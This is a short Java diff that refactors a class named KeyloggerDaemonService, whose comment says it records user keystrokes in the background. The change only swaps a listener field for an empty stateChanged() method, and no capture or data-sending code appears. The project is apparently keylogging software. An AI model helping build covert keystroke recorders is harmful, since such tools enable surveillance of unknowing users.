@@ -8,7 +8,7 @@ import org.springframework.beans.factory.annotation.Autowired;
 /**
  * Service that records user key strokes in the background and registers them to the client state.
  */
-public class KeyloggerDaemonService {
+public class KeyloggerDaemonService implements ClientStateModel.IClientStateListener {
 
     @Autowired
     private ClientStateController controller;
@@ -19,10 +19,9 @@ public class KeyloggerDaemonService {
      * Implementation of listener to the ClientStateModel.
      * The status will contain a flag for whether the daemon should be running.
      */
-    @Getter
-    private ClientStateModel.IClientStateListener listener = () -> {
-        return;
-    };
+    public void stateChanged() {
+
+    }
 
     /**
      * Start running the daemon.
